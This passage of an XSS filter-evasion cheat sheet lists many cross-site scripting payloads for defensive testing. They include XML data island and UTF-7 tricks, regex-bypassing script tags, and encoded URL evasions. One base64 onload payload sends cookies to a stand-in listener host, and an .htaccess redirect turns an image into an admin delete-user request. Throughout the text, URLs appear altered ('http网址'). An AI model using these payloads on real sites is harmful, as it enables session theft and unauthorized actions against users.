<span class="nx">d</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert('XSS');</span><span class="se">\"</span><span class="s2">)</span><span class="dl">"</span><span class="p">;</span>
<span class="nf">eval</span><span class="p">(</span><span class="nx">a</span><span class="o">+</span><span class="nx">b</span><span class="o">+</span><span class="nx">c</span><span class="o">+</span><span class="nx">d</span><span class="p">);</span>
</pre></table></code></div></div><p>XML Data Island with CDATA Obfuscation This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">XML</span> <span class="nx">ID</span><span class="o">=</span><span class="dl">"</span><span class="s2">xss</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="nx">I</span><span class="o">&gt;&lt;</span><span class="nx">B</span><span class="o">&gt;&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javas&lt;!-- --&gt;cript:alert('XSS')</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/B&gt;&lt;/</span><span class="nx">I</span><span class="o">&gt;&lt;</span><span class="sr">/XML</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">SPAN</span> <span class="nx">DATASRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">#xss</span><span class="dl">"</span> <span class="nx">DATAFLD</span><span class="o">=</span><span class="dl">"</span><span class="s2">B</span><span class="dl">"</span> <span class="nx">DATAFORMATAS</span><span class="o">=</span><span class="dl">"</span><span class="s2">HTML</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SPAN</span><span class="err">&gt;
</span>
</pre></table></code></div></div><p>Locally hosted XML with embedded JavaScript that is generated using an XML data island This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">XML</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">xsstest.xml</span><span class="dl">"</span> <span class="nx">ID</span><span class="o">=</span><span class="nx">I</span><span class="o">&gt;&lt;</span><span class="sr">/XML</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">SPAN</span> <span class="nx">DATASRC</span><span class="o">=</span><span class="err">#</span><span class="nx">I</span> <span class="nx">DATAFLD</span><span class="o">=</span><span class="nx">C</span> <span class="nx">DATAFORMATAS</span><span class="o">=</span><span class="nx">HTML</span><span class="o">&gt;&lt;</span><span class="sr">/SPAN</span><span class="err">&gt;
</span>
</pre></table></code></div></div><p>HTML+TIME in XML This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">HTML</span><span class="o">&gt;&lt;</span><span class="nx">BODY</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="p">?</span><span class="nx">xml</span><span class="p">:</span><span class="nx">namespace</span> <span class="nx">prefix</span><span class="o">=</span><span class="dl">"</span><span class="s2">t</span><span class="dl">"</span> <span class="nx">ns</span><span class="o">=</span><span class="dl">"</span><span class="s2">urn:schemas-microsoft-com:time</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="p">?</span><span class="k">import</span> <span class="nx">namespace</span><span class="o">=</span><span class="dl">"</span><span class="s2">t</span><span class="dl">"</span> <span class="nx">implementation</span><span class="o">=</span><span class="dl">"</span><span class="s2">#default#time2</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">t</span><span class="p">:</span><span class="kd">set</span> <span class="nx">attributeName</span><span class="o">=</span><span class="dl">"</span><span class="s2">innerHTML</span><span class="dl">"</span> <span class="nx">to</span><span class="o">=</span><span class="dl">"</span><span class="s2">XSS&lt;SCRIPT DEFER&gt;alert(</span><span class="dl">"</span><span class="nx">XSS</span><span class="dl">"</span><span class="s2">)&lt;/SCRIPT&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/BODY&gt;&lt;/</span><span class="nx">HTML</span><span class="o">&gt;</span>
<span class="nx">Assuming</span> <span class="nx">you</span> <span class="nx">can</span> <span class="nx">only</span> <span class="nx">fit</span> <span class="k">in</span> <span class="nx">a</span> <span class="nx">few</span> <span class="nx">characters</span> <span class="nx">and</span> <span class="nx">it</span> <span class="nx">filters</span> <span class="nx">against</span> <span class="p">.</span><span class="nx">js</span>
<span class="nx">You</span> <span class="nx">can</span> <span class="nx">rename</span> <span class="nx">your</span> <span class="nx">JavaScript</span> <span class="nx">file</span> <span class="nx">to</span> <span class="nx">an</span> <span class="nx">image</span> <span class="k">as</span> <span class="nx">an</span> <span class="nx">XSS</span> <span class="nx">vector</span><span class="p">:</span>
</pre></table></code></div></div><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址xss.rocks/xss.jpg</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="ssi-server-side-includes">SSI (Server Side Includes)</h2><p>This requires SSI to be installed on the server to use this XSS vector. I probably don’t need to mention this, but if you can run commands on the server there are no doubt much more serious issues:</p><p>PHP Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts ## remotely like this, there are probably much more dire issues:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
</pre></table></code></div></div><p>IMG Embedded Commands This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc…. This is one of the lesser used but more useful XSS vectors:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>IMG Embedded Commands part II This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <img data-proofer-ignore data-src="httx://badguy.com/a.jpg" /> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Redirect 302 /a.jpg http网址victimsite.com/admin.asp&amp;deleteuser
</pre></table></code></div></div><p>Cookie Manipulation Admittedly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim’s cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc…):</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">META</span> <span class="nx">HTTP</span><span class="o">-</span><span class="nx">EQUIV</span><span class="o">=</span><span class="dl">"</span><span class="s2">Set-Cookie</span><span class="dl">"</span> <span class="nx">Content</span><span class="o">=</span><span class="dl">"</span><span class="s2">USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>UTF-7 Encoding If the page that the XSS resides on doesn’t provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don’t need the charset statement if the user’s browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google’s custom 404 script.:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">HEAD</span><span class="o">&gt;&lt;</span><span class="nx">META</span> <span class="nx">HTTP</span><span class="o">-</span><span class="nx">EQUIV</span><span class="o">=</span><span class="dl">"</span><span class="s2">CONTENT-TYPE</span><span class="dl">"</span> <span class="nx">CONTENT</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/html; charset=UTF-7</span><span class="dl">"</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="sr">/HEAD&gt;+ADw-SCRIPT+AD4-alert</span><span class="se">(</span><span class="sr">'XSS'</span><span class="se">)</span><span class="sr">;+ADw-/</span><span class="nx">SCRIPT</span><span class="o">+</span><span class="nx">AD4</span><span class="o">-</span>

</pre></table></code></div></div><p>XSS Using HTML Quote Encapsulation This was tested in IE, your mileage may vary. For performing XSS on sites that allow <script> but don’t allow &lt;SCRIPT SRC... by way of a regex filter /\&lt;script\[^\&gt;\]+src/i:</script></p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">a</span><span class="o">=</span><span class="dl">"</span><span class="s2">&gt;</span><span class="dl">"</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">httx://xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><p>For performing XSS on sites that allow <script> but don’t allow \&lt;script src... by way of a regex filter /\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i (this is an important one, because I’ve seen this regex in the wild):</script></p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="o">=</span><span class="dl">"</span><span class="s2">&gt;</span><span class="dl">"</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">httx://xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><div class="table-wrapper"><table><tbody><tr><td>Another XSS to evade the same filter, /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”<td>’(.)*?’<td>[^’”&gt;\s]+))?)+\s*<td>\s*)src/i:</table></div><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">a</span><span class="o">=</span><span class="dl">"</span><span class="s2">&gt;</span><span class="dl">"</span> <span class="dl">''</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">httx://xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><div class="table-wrapper"><table><tbody><tr><td>Yet another XSS to evade the same filter, /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”<td>’(.)*?’<td>[^’”&gt;\s]+))?)+\s*<td>\s*)src/i. I know I said I wasn’t goint to discuss mitigation techniques but the only thing I’ve seen work for this XSS example if you still want to allow <script> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <script> tags):</script></script></table></div><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="dl">"</span><span class="s2">a='&gt;'</span><span class="dl">"</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">httx://xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><div class="table-wrapper"><table><tbody><tr><td>And one last XSS attack to evade, /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”<td>’(.)*?’<td>[^’”&gt;\s]+))?)+\s*<td>\s*)src/i using grave accents (again, doesn’t work in Firefox):</table></div><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">a</span><span class="o">=&gt;</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">httx://xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Here’s an XSS example that bets on the fact that the regex won’t catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">a</span><span class="o">=</span><span class="dl">"</span><span class="s2">&gt;'&gt;</span><span class="dl">"</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">httx://xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><p>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;SCRI</span><span class="dl">"</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/SCRIPT&gt;PT SRC="httx:/</span><span class="o">/</span><span class="nx">xss</span><span class="p">.</span><span class="nx">rocks</span><span class="o">/</span><span class="nx">xss</span><span class="p">.</span><span class="nx">js</span><span class="dl">"</span><span class="s2">&gt;&lt;/SCRIPT&gt;
</span></pre></table></code></div></div><p>URL String Evasion Assuming http网址www.google.com/ is programmatically disallowed:</p><p>IP Versus Hostname</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址66.102.7.147/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>URL Encoding</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>DWORD Encoding Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址1113982867/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Hex Encoding The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址0x42.0x0000066.0x7.0x93/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Octal Encoding Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc…:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址0102.0146.0007.00000223/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Base64 Encoding</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">onload</span><span class="o">=</span><span class="dl">"</span><span class="s2">eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>Mixed Encoding Let’s mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I’ll never know). The tabs and newlines only work if this is encapsulated with quotes:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">h
tt  p://6	6.000146.0x7.147/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span>
<span class="nx">Protocol</span> <span class="nx">Resolution</span> <span class="nx">Bypass</span>
<span class="c1">// translates to http网址 which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.</span>

<span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">//www.google.com/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Google “feeling lucky” part 1. Firefox uses Google’s “feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox’s keyword: protocol. You can concatenate several keywords by using something like the following keyword:XSS+RSnake for instance. This no longer works within Firefox as of 2.0.</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">//google</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Google “feeling lucky” part 2. This uses a very tiny trick that appears to work Firefox only, because of it’s implementation of the “feeling lucky” function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It’s simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址ha.ckers.org@google</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Google “feeling lucky” part 3. This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the “feeling lucky” function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case “google”):</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址google:ha.ckers.org</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Removing CNAMEs When combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址google.com/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Extra dot for absolute DNS:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址www.google.com./</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>JavaScript Link Location:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:document.location='http网址www.google.com/'</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Content Replace as Attack Vector Assuming http网址www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&#x09;script: was converted into java script:, which renders in IE, Netscape 8.1+ in secure site mode and Opera):</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">A</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址www.google.com/ogle.com/</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/A</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Assisting XSS with HTTP Parameter Pollution Assume a content sharing flow on a web site is implemented as below. There is a “Content” page which includes some content provided by users and this page also includes a link to “Share” page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the “title” parameter in the “Content” page to prevent against XSS but for some reasons they didn’t URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type’s value is a constant and will always be integer, they didn’t encode or validate the content_type in the “Share” page.</p><p>Content Page Source Code a href=”/Share?content_type=1&amp;title=&lt;%=Encode.forHtmlAttribute(untrusted content title)%&gt;”&gt;Share&lt;/a&gt;</p><p>Share Page Source Code</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">contentType</span> <span class="o">=</span> <span class="o">&lt;%=</span><span class="nx">Request</span><span class="p">.</span><span class="nf">getParameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">content_type</span><span class="dl">"</span><span class="p">)</span><span class="o">%&gt;</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">title</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;%=Encode.forJavaScript(request.getParameter(</span><span class="dl">"</span><span class="nx">title</span><span class="dl">"</span><span class="s2">))%&gt;</span><span class="dl">"</span><span class="p">;</span>
<span class="p">...</span>
<span class="c1">//some user agreement and sending to server logic might be here</span>
<span class="p">...</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Content Page Output In this case if attacker set untrusted content title as “This is a regular title&amp;content_type=1;alert(1)” the link in “Content” page would be this:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
